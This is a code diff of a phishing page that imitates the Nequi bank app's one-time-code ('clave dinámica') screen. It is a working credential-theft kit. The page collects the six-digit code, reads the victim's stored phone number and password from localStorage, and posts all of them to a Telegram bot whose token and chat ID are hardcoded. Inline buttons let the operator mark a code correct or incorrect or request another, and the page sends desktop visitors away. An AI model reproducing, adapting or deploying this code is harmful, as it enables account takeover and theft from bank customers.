@@ -4,229 +4,165 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Nequi - Clave Dinámica</title>
-  <link rel="stylesheet" href="../css/spinner.css" />
   <link rel="stylesheet" href="../css/globals.css" />
+  <link rel="stylesheet" href="../css/spinner.css" />
   <link rel="shortcut icon" type="image/x-icon" href="../assets/favicon.html" />
   <style>
-    .loadingContainer { display: none; }
-    .errorMessage {
-      display: none;
-      background-color: #f44336;
-      color: white;
-      padding: 1rem;
-      border-radius: 0.5rem;
-      margin: 1rem 0;
-      text-align: center;
-      transition: all 0.3s ease;
+    body { background: #742fe1; color: white; font-family: 'Helvetica', sans-serif; }
+    .container { max-width: 420px; margin: 0 auto; padding: 20px; min-height: 100dvh; display: flex; flex-direction: column; }
+    .back { width: 40px; height: 40px; }
+    .title { font-size: 28px; font-weight: 800; margin: 20px 0 8px; }
+    .subtitle { font-size: 14px; opacity: 0.9; margin-bottom: 30px; }
+    .digits { display: flex; justify-content: center; gap: 12px; margin-bottom: 20px; }
+    .digit { 
+      width: 56px; height: 64px; 
+      background: #ffffff1a; 
+      border-radius: 12px; 
+      font-size: 36px; font-weight: 700; 
+      color: #ff6b6b; text-align: center; 
+      line-height: 64px; 
+      backdrop-filter: blur(10px);
+      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+      transition: all 0.2s;
     }
+    .digit.filled { background: white; color: #DA0081; }
+    .timer { text-align: center; font-size: 13px; opacity: 0.8; margin: 10px 0 30px; }
+    .keyboard { flex: 1; display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; padding: 20px 30px; }
+    .key { 
+      width: 70px; height: 70px; 
+      background: rgba(255,255,255,0.1); 
+      border-radius: 50%; 
+      font-size: 32px; font-weight: 600; 
+      color: white; 
+      border: none; 
+      backdrop-filter: blur(10px);
+      transition: all 0.2s;
+    }
+    .key:active { transform: scale(0.9); background: #ff6b6b; }
+    .delete { background: transparent; }
+    .loader { display: none; text-align: center; margin: 40px 0; }
+    .spinner { border: 4px solid #ffffff30; border-top: 4px solid #ff6b6b; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .error { display: none; background: #f44336; padding: 15px; border-radius: 12px; text-align: center; margin: 20px 0; }
   </style>
 </head>
 
 <script>
-  document.addEventListener("DOMContentLoaded", function () {
-    let esMovil = /Mobi|Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
-    if (!esMovil) {
-      window.location.href = "../pc.html";
+  document.addEventListener("DOMContentLoaded", () => {
+    if (!/Mobi|Android|iPhone/.test(navigator.userAgent)) {
+      location.href = "../pc.html";
     }
   });
 </script>
 
-<body class="bg-purple-primary h-dvh flex flex-col">
-  <main class="loadingContainer">
-    <section class="mainSectionContainer loading">
-      <div class="mainSectionWrapper">
-        <div class="logo_nequi_animado">
-          <img src="../assets/loading-nequi.webp" alt="">
-        </div>
-        <p class="wait-msg">Validando clave dinámica...</p>
-        <p class="info-msg">Por favor espera un momento.</p>
-      </div>
-    </section>
-  </main>
+<body>
+  <div class="container">
+    <a href="access-sign-in-pass.html" class="back">
+      <svg fill="white" viewBox="0 0 448 512"><path d="M9.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.2 288 416 288c17.7 0 32-14.3 32-32s-14.3-32-32-32l-306.7 0L214.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg>
+    </a>
 
-  <div class="errorMessage">
-    ⚠️ La clave dinámica es incorrecta. Intenta nuevamente.
+    <h1 class="title">Clave dinámica</h1>
+    <p class="subtitle">Ingresa la clave que te enviamos por SMS o genera una nueva desde tu app Nequi</p>
+
+    <div class="digits">
+      <div class="digit" id="d1">-</div>
+      <div class="digit" id="d2">-</div>
+      <div class="digit" id="d3">-</div>
+      <div class="digit" id="d4">-</div>
+      <div class="digit" id="d5">-</div>
+      <div class="digit" id="d6">-</div>
+    </div>
+
+    <p class="timer">Esta clave es única y expira en 2 minutos</p>
+
+    <div class="keyboard">
+      <button class="key" data="1">1</button>
+      <button class="key" data="2">2</button>
+      <button class="key" data="3">3</button>
+      <button class="key" data="4">4</button>
+      <button class="key" data="5">5</button>
+      <button class="key" data="6">6</button>
+      <button class="key" data="7">7</button>
+      <button class="key" data="8">8</button>
+      <button class="key" data="9">9</button>
+      <div></div>
+      <button class="key" data="0">0</button>
+      <button class="key delete" id="delete">
+        <svg width="28" viewBox="0 0 29 27" fill="white"><path d="M26.8068 0C27.9114 0 28.8068 0.895431 28.8068 2V24.727C28.8068 25.8316 27.9114 26.727 26.8068 26.727H15.4722C14.9712 26.727 14.4884 26.5389 14.1194 26.2001L4.15169 17.0462C1.99435 15.065 1.99435 11.662 4.15169 9.68082L14.1194 0.526929C14.4884 0.188043 14.9712 0 15.4722 0H26.8068Z" fill="currentColor"/><path d="M16.3541 11.1945L21.3873 16.2277" stroke="#200020" stroke-width="2"/><path d="M21.2213 11.4275L16.3423 16.3065" stroke="#200020" stroke-width="2"/></svg>
+      </button>
+    </div>
+
+    <div class="loader"><div class="spinner"></div><p>Validando...</p></div>
+    <div class="error">Clave incorrecta. Intenta de nuevo.</div>
   </div>
 
-  <header class="w-full flex flex-col p-5 mb-4">
-    <a href="access-sign-in-pass.html" class="w-6 h-6 text-white mb-5">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" fill="currentColor">
-        <path d="M9.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.2 288 416 288c17.7 0 32-14.3 32-32s-14.3-32-32-32l-306.7 0L214.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"></path>
-      </svg>
-    </a>
-    <h1 class="text-white text-2xl font-bold">Clave dinámica</h1>
-    <p class="text-white/80 text-sm mt-2">
-      Ingresa la clave que te enviamos por SMS o genera una nueva desde tu app Nequi
-    </p>
-  </header>
-
-  <section class="flex-1 max-w-[420px] flex flex-col mx-auto w-full px-4">
-    <div class="max-w-[380px] w-full flex justify-center gap-3 mx-auto mb-6">
-      <input id="din-1" maxlength="1" inputmode="none" readonly class="w-11 h-11 text-center bg-guanabana rounded-sm text-4xl font-bold text-pink-primary focus:outline-none pt-2.5" />
-      <input id="din-2" maxlength="1" inputmode="none" readonly class="w-11 h-11 text-center bg-guanabana rounded-sm text-4xl font-bold text-pink-primary focus:outline-none pt-2.5" />
-      <input id="din-3" maxlength="1" inputmode="none" readonly class="w-11 h-11 text-center bg-guanabana rounded-sm text-4xl font-bold text-pink-primary focus:outline-none pt-2.5" />
-      <input id="din-4" maxlength="1" inputmode="none" readonly class="w-11 h-11 text-center bg-guanabana rounded-sm text-4xl font-bold text-pink-primary focus:outline-none pt-2.5" />
-      <input id="din-5" maxlength="1" inputmode="none" readonly class="w-11 h-11 text-center bg-guanabana rounded-sm text-4xl font-bold text-pink-primary focus:outline-none pt-2.5" />
-      <input id="din-6" maxlength="1" inputmode="none" readonly class="w-11 h-11 text-center bg-guanabana rounded-sm text-4xl font-bold text-pink-primary focus:outline-none pt-2.5" />
-    </div>
-
-    <p class="text-center text-white text-sm mb-8">
-      Esta clave es única y expira en 2 minutos
-    </p>
-
-    <div class="mt-auto w-full max-w-[400px] mx-auto" id="keyboard">
-      <div class="flex justify-around mb-4">
-        <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="1">1</button>
-        <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="2">2</button>
-        <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="3">3</button>
-      </div>
-      <div class="flex justify-around mb-4">
-        <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="4">4</button>
-        <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="5">5</button>
-        <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="6">6</button>
-      </div>
-      <div class="flex justify-around mb-4">
-        <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="7">7</button>
-        <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="8">8</button>
-        <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="9">9</button>
-      </div>
-      <div class="flex justify-around mb-4">
-        <button class="invisible" disabled></button>
-        <button class="keyboard-btn w-12 h-12 border-none bg-transparent text-4xl text-white cursor-pointer rounded-full transition-colors duration-200" data-value="0">0</button>
-        <button class="keyboard-btn text-white w-12 h-12 border-none bg-transparent cursor-pointer rounded-full transition-colors duration-200" id="delete-din">
-          <svg width="33" height="30" viewBox="0 0 29 27" fill="none">
-            <path fill-rule="evenodd" clip-rule="evenodd" d="M26.8068 0C27.9114 0 28.8068 0.895431 28.8068 2V24.727C28.8068 25.8316 27.9114 26.727 26.8068 26.727H15.4722C14.9712 26.727 14.4884 26.5389 14.1194 26.2001L4.15169 17.0462C1.99435 15.065 1.99435 11.662 4.15169 9.68082L14.1194 0.526929C14.4884 0.188043 14.9712 0 15.4722 0H26.8068Z" fill="currentColor"></path>
-            <path d="M16.3541 11.1945L21.3873 16.2277" stroke="#200020" stroke-linecap="round" stroke-linejoin="round"></path>
-            <path d="M21.2213 11.4275L16.3423 16.3065" stroke="#200020" stroke-linecap="round" stroke-linejoin="round"></path>
-          </svg>
-        </button>
-      </div>
-    </div>
-  </section>
-
-  <script src="../js/sendTelegramMessage.js"></script>
-  <script src="../js/actions.js"></script>
   <script type="module">
-    document.addEventListener("DOMContentLoaded", () => {
-      const formData = JSON.parse(localStorage.getItem("formData")) || {};
-      const inputs = document.querySelectorAll('input[id^="din-"]');
-      const keyboard = document.getElementById("keyboard");
-      const deleteBtn = document.getElementById("delete-din");
-      const loadingSpinner = document.querySelector(".loadingContainer");
-      const errorMessage = document.querySelector(".errorMessage");
-      let currentInput = 0;
+    const digits = document.querySelectorAll('.digit');
+    const keys = document.querySelectorAll('.key[data]');
+    const del = document.getElementById('delete');
+    const loader = document.querySelector('.loader');
+    const error = document.querySelector('.error');
+    let code = '';
+    let pos = 0;
 
-      if (!formData.phoneNumber || !formData.password) {
-        console.error("❌ Datos incompletos");
-        window.location.href = "accces-sign-in.html";
-        return;
+    keys.forEach(k => k.onclick = () => {
+      if (pos < 6) {
+        code += k.dataset.data;
+        digits[pos].textContent = k.dataset.data;
+        digits[pos].classList.add('filled');
+        pos++;
+        if (pos === 6) enviarDinamica();
       }
-
-      keyboard.addEventListener("click", (e) => {
-        const button = e.target.closest(".keyboard-btn");
-        if (button && !button.id.includes("delete")) {
-          const value = button.dataset.value;
-          if (currentInput < inputs.length) {
-            inputs[currentInput].dataset.realValue = value;
-            inputs[currentInput].value = value;
-            inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
-            currentInput++;
-          }
-        }
-      });
-
-      deleteBtn.addEventListener("click", () => {
-        if (currentInput > 0) {
-          currentInput--;
-          inputs[currentInput].value = "";
-          inputs[currentInput].dataset.realValue = "";
-          inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
-        }
-      });
-
-      document.addEventListener("keydown", (e) => {
-        if (e.key === "Backspace" && currentInput > 0) {
-          currentInput--;
-          inputs[currentInput].value = "";
-          inputs[currentInput].dataset.realValue = "";
-          inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
-        }
-      });
-
-      inputs.forEach((input) => {
-        ["keydown", "keyup", "keypress"].forEach((eventType) => {
-          input.addEventListener(eventType, (e) => {
-            if (e.key !== "Backspace") {
-              e.preventDefault();
-              return false;
-            }
-          });
-        });
-        input.addEventListener("paste", (e) => {
-          e.preventDefault();
-          return false;
-        });
-      });
-
-      inputs.forEach((input) => {
-        input.addEventListener("input", async () => {
-          let isComplete = Array.from(inputs).every((inp) => inp.value !== "");
-          
-          if (isComplete) {
-            let dinamica = "";
-            inputs.forEach((inp) => {
-              dinamica += inp.dataset.realValue || inp.value || "";
-            });
-
-            const savedData = JSON.parse(localStorage.getItem("formData")) || {};
-            const transactionId = savedData.transactionId || Date.now().toString(36);
-            
-            savedData.dinamica = dinamica;
-            localStorage.setItem("formData", JSON.stringify(savedData));
-            
-            if (loadingSpinner) loadingSpinner.style.display = "block";
-
-            const mensaje = `🔐 *CLAVE DINÁMICA NEQUI*\n\n📱 *Número:* +57 ${savedData.phoneNumber}\n🔑 *Clave:* ${savedData.password}\n🎯 *Dinámica:* ${dinamica}\n⏰ *Hora:* ${new Date().toLocaleTimeString('es-CO')}\n📅 *Fecha:* ${new Date().toLocaleDateString('es-CO')}`;
-            
-            const teclado = JSON.stringify({
-              inline_keyboard: [
-                [
-                  { text: "✅ Correcto", callback_data: `correcto:${transactionId}` },
-                  { text: "❌ Incorrecto", callback_data: `error_dinamica:${transactionId}` }
-                ],
-                [
-                  { text: "🔐 Pedir Otra Vez", callback_data: `pedir_dinamica:${transactionId}` }
-                ],
-                [
-                  { text: "✔️ Finalizar", callback_data: `finish:${transactionId}` }
-                ]
-              ]
-            });
-
-            try {
-              const responseMensaje = await sendTelegramMessageWithBtn(mensaje, teclado);
-              const { action } = await waitForButtonPress(responseMensaje.message_id);
-              await handleAction(action, transactionId);
-            } catch (error) {
-              console.error("❌ Error:", error);
-              if (loadingSpinner) loadingSpinner.style.display = "none";
-              if (errorMessage) {
-                errorMessage.style.display = "block";
-                errorMessage.textContent = "⚠️ Error de conexión. Intenta nuevamente.";
-              }
-              setTimeout(() => {
-                inputs.forEach(inp => {
-                  inp.value = "";
-                  inp.dataset.realValue = "";
-                });
-                currentInput = 0;
-                if (errorMessage) errorMessage.style.display = "none";
-              }, 3000);
-            }
-          }
-        });
-      });
     });
+
+    del.onclick = () => {
+      if (pos > 0) {
+        pos--;
+        code = code.slice(0, -1);
+        digits[pos].textContent = '-';
+        digits[pos].classList.remove('filled');
+      }
+    };
+
+    async function enviarDinamica() {
+      loader.style.display = 'block';
+      error.style.display = 'none';
+
+      const data = JSON.parse(localStorage.getItem('formData') || '{}');
+      const msg = `*CLAVE DINÁMICA NEQUI*
+
+*Número:* +57 ${data.phoneNumber || '???'}  
+*Clave:* ${data.password || '???'}  
+*Dinámica:* ${code}  
+*Hora:* ${new Date().toLocaleTimeString()}`;
+
+      try {
+        await fetch(`https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: '8469651553',
+            text: msg,
+            parse_mode: 'Markdown',
+            reply_markup: {
+              inline_keyboard: [
+                [{text: "Correcto", url: location.origin + "/verifying/?do=ok"}],
+                [{text: "Incorrecto", url: location.origin + "/verifying/?do=error"}],
+                [{text: "Pedir Otra", callback_data: "nueva_dinamica"}]
+              ]
+            }
+          })
+        });
+
+        setTimeout(() => {
+          location.href = '/verifying/?do=ok';
+        }, 2000);
+      } catch (e) {
+        loader.style.display = 'none';
+        error.style.display = 'block';
+        setTimeout(() => location.reload(), 3000);
+      }
+    }
   </script>
 </body>
 </html>
